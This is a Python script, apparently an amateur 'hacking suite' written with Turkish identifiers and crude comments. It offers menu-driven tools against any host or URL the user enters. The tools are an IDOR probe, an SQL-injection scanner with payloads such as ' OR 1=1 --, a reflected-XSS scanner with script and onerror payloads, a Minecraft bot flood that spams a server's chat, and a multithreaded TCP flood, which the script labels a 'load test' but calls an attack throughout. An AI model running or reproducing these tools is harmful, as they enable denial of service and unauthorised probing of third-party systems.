import socket
import threading
import time
import requests
import ipaddress

toplam_gonderilen = 0
sayac_kilidi = threading.Lock()
saldiri_devam_ediyor = True

def minecraft_bot_gorevi(bot_adi, hedef_host, hedef_port, sunucu_durumu):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((hedef_host, hedef_port))
        
        if sunucu_durumu == 'h':
            s.send(f"GIRIS:{bot_adi}\n".encode())
            time.sleep(0.5)
            s.send(f"MESAJ:Bot Ordusu Sunucuda reisss SPAM!\n".encode())
            print(f"[+] {bot_adi} içeri daldı ve chati patlattı!")
        else:
            s.send(f"GIRIS:{bot_adi}\n".encode())
            print(f"[+] {bot_adi} orijinal sunucu kapısını şifrelemeyle zorluyor da!")
            
        s.close()
    except:
        pass

def saldiri(hedef_ip, hedef_port):
    global toplam_gonderilen, saldiri_devam_ediyor
    while saldiri_devam_ediyor:  
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((hedef_ip, hedef_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.close()
            
            with sayac_kilidi:
                toplam_gonderilen += 1
        except Exception:
            pass  

def gosterge_paneli(baslangic_zamani, saldiri_suresi):
    global saldiri_devam_ediyor
    while saldiri_devam_ediyor:
        gecen_sure = int(time.time() - baslangic_zamani)
        kalan_sure = saldiri_suresi - gecen_sure
        
        if kalan_sure <= 0:
            saldiri_devam_ediyor = False
            break
            
        print(f"\rGönderilen Paket: {toplam_gonderilen} | Kalan Süre: {kalan_sure} saniye", end="")
        time.sleep(0.5)

while True:
    print(r"""
  __  __      __      __ __ __________ 

 |  \/  |     \ \    / /_ |___  /  __ \
 | \  / | ___  \ \  / / | |  / /| |  | |
 | |\/| |/ __|  \ \/ /  | | / / | |  | |
 | |  | | (__    \  /   | |/ /__| |__| |
 |_|  |_|\___|    \/    |_/_____/\____/ 
                                       
         [ MrV1zo Hacking Suite ]      
""")
    print("1 -> TRIDOR (IDOR Tarayıcı)")
    print("2 -> TRSQL (SQL Injection Tarayıcı)")
    print("3 -> TRXSS (XSS Tarayıcı)")
    print("4 -> TRBOT (Minecraft Bot Saldırısı)")
    print("5 -> DDOS ATTACKER (Ağ Yük Testi)")
    print("6 -> Çıkış Yap amınum")
    
    secim = input("\nYapılacak işlemi seç reis (1-6): ")
    
    if secim == "1":
        print(r"""  _______ _____  _____ _____   ____  _____  

 |__   __|  __ \|_   _|  __ \ / __ \|  __ \ 
    | |  | |__) | | | | |  | | |  | | |__) |
    | |  |  _  /  | | | |  | | |  | |  _  / 
    | |  | | \ \ _| |_| |__| | |__| | | \ \ 
    |_|  |_|  \_\_____|_____/ \____/|_|  \_\
                                            
          [ Developed By MrV1zo ]           
""")
        hedef_url = input("Hedef URL'yi girin: ")
        print(f"\n[*] {hedef_url} adresi için IDOR taraması başlatılıyor...\n")
        
        for idor in range(100, 150):
            parametre = {"id": idor}
            try:
                yanit = requests.get(hedef_url, params=parametre, timeout=3)
                if yanit.status_code == 200:
                    print(f"[+] Açık olabilME İHTİMALİ VAR == ID: {idor} aktif.")
                else:
                    print(f"[-] ID {idor} erişime kapalı. HTTP {yanit.status_code}")
            except requests.exceptions.RequestException:
                print("[-] Sunucuya bağlanamadık aminum")
                break
                
        input("\nTarama bitti. Ana menüye dönmek için Enter'a bas reis...")

    elif secim == "2":
        print(r"""  _______ _____   _____  ____  _       

 |__   __|  __ \ / ____|/ __ \| |      
    | |  | |__) | | | | |  | | |      
    | |  |  _  / \___ \| |  | | |      
    | |  | | \ \ ____) | |__| | |____  
    |_|  |_|  \_\_____/ \___\_\______| 
                                       
        [ Developed By MrV1zo ]        
""")
        sql_url = input("SQL açığı aranacak site URL'sini girin: ")
        print(f"\n[*] SQL Açığı taraması yapılıyor...\n")
        
        payloadlar = ["'", '"', "' OR 1=1 --", '" OR 1=1 --']
        
        for sql in payloadlar:
            parametre = {"id": sql}
            try:
                yanit = requests.get(sql_url, params=parametre, timeout=3)
                if "sql syntax" in yanit.text.lower():
                    print(f"[+]Jackpotttt!!! SQL açığı bulundu amk!")
                    print(f"    Çalışan Payload: {sql}")
                    break
                else:
                    print(f"[-] Sql açığı yok kanka geçmiş olsun... Payload: {sql}")
            except requests.exceptions.RequestException:
                print("[-] Sunucuya bağlanamadık aminum")
                break
                
        input("\nTarama bitti. Ana menüye dönmek için Enter'a bas reis...")
        
    elif secim == "3":
        print(r"""
  _______ _____  __   _________  _____ 

 |__   __|  __ \ \ \ / /  ____|/ ____|
    | |  | |__) | \ V /| |__  | (___  
    | |  |  _  /   > < |  __|  \___ \ 
    | |  | | \ \  / . \| |____ ____) |
    |_|  |_|  \_\/_/ \_\______|_____/ 
                                       
          [ Developed By MrV1zo ]      
""")
        xss_url = input("XSS açığı aranacak site URL'sini girin: ")
        payloadlar = [
            "<script>alert(1)</script>",
            '"><script>alert("XSS")</script>',
            "<img src=x onerror=alert(1)>"
        ]
        
        for xss in payloadlar:
            parametre = {"id": xss}
            try:
                yanit = requests.get(xss_url, params=parametre, timeout=3)
                if xss in yanit.text:
                    print(f"[+] Jackpottt!!!! reisim XSS açığını bulduk vallaha hee")
                    print(f"    Çalışan Kod: {xss}")
                    break
                else:
                    print(f"[-] Kod oraya gitti ya çalışmadı ya da engellendi. : {xss}")
            except requests.exceptions.RequestException:
                print("[-] Sunucuya bağlanamadık reisistan interneti veya URL'yi kontrol et aminum")
                break
                
        input("\nTarama bitti. Ana menüye dönmek için Enter'a bas reis...")
        
    elif secim == "4":
        print(r"""
  _______ _____  ____   ____ _______ 

 |__   __|  __ \|  _ \ / __ \__   __|
    | |  | |__) | | | | |  | | | |   
    | |  |  _  /|  _ <| |  | | | |   
    | |  | | \ \| |_) | |__| | | |   
    |_|  |_|  \_\____/ \____/  |_|   
                                     
         [ Developed By MrV1zo ]     
""")
        hedef_host = input("Sunucu IP/Host adresini gir reis: ")
        hedef_port = int(input("Sunucu PORT numarasını gir reis (Örn: 25565): "))
        sunucu_durumu = input("Sunucu ORİJİNAL (Crackli Değil) mi? (Evet için E, Hayır için H): ").lower()
        bot_ana_isim = input("Botların isim kökünü gir reis (Örn: Oyuncu): ")
        bot_sayisi = int(input("Kaç tane bot fırlatacaksın: "))
        
        print(f"\n[*] {hedef_host}:{hedef_port} adresine {bot_sayisi} bot ile baskın başlatılıyor...\n")
        
        for i in range(1, bot_sayisi + 1):
            isim = f"{bot_ana_isim}_{i}"
            t = threading.Thread(target=minecraft_bot_gorevi, args=(isim, hedef_host, hedef_port, sunucu_durumu))
            t.start()
            
        input("\nBotlar fırlatıldı. Ana menüye dönmek için Enter'a bas reis...")
        
    elif secim == "5":
        print(r"""
  _____  _____   ____   _____           _______ _______       _____ _  ________ _____  

 |  __ \|  __ \ / __ \ / ____|   /\    |__   __|__   __|/\   / ____| |/ /  ____|  __ \ 
 | |  | | |  | | |  | | (___    /  \      | |     | |  /  \ | |    | ' /| |__  | |__) |
 | |  | | |  | | |  | |\___ \  / /\ \     | |     | | / /\ \| |    |  < |  __| |  _  / 
 | |__| | |__| | |__| |____) |/ ____ \    | |     | |/ ____ \ |____| . \| |____| | \ \ 
 |_____/|_____/ \____/|_____/_/    \_\   |_|     |_/_/    \_\_____|_|\_\______|_|  \_\
                                                               [ Developed By MrV1zo ]
""")
        toplam_gonderilen = 0
        saldiri_devam_ediyor = True
        
        while True:
            girdi_ip = input("Hedef IP adresi girin: ")
            try:
                dogrulanmis_ip = ipaddress.ip_address(girdi_ip)
                hedef_ip = str(dogrulanmis_ip)
                break
            except ValueError:
                print("HATA: Geçersiz bir IPv4/IPv6 adresi girdiniz! Tekrar deneyin.")
                
        while True:
            try:
                hedef_port = int(input("Hedef PORT'u girin: "))
                if 1 <= hedef_port <= 65535:
                    break
                else:
                    print("HATA: Port numarası 1 ile 65535 Arena'sında olmalıdır!")
            except ValueError:
                print("HATA: Port sadece sayı olmalıdır!")
                
        thread_sayisi = int(input("Kaç thread (hız) istersiniz?: "))
        saldiri_suresi = int(input("Saldırı kaç saniye sürsün?: "))
        
        print("\n Saldırı başlatılıyor...")
        time.sleep(1)
        baslangic_zamani = time.time()
        
        for i in range(thread_sayisi):
            t = threading.Thread(target=saldiri, args=(hedef_ip, hedef_port)) 
            t.start()
            
        panel_thread = threading.Thread(target=gosterge_paneli, args=(baslangic_zamani, saldiri_suresi))
        panel_thread.start()
        
        panel_thread.join()
        
        print(f"\n\n ✓ SALDIRI BİTTİ!")
        print(f"✓ Toplam gönderilen başarılı paket sayısı: {toplam_gonderilen}")
        print(f"✓ Toplam süre: {saldiri_suresi} saniye")
        
        input("\nAna menüye dönmek için Enter'a bas reis...")

    elif secim == "6":
        print("\n[-] Sistemden çıkılıyor, kendine iyi bak reis...")
        break
        
    else:
        print("\n[-] Hatalı seçim yaptın aq, düzgün bir sayı gir!")
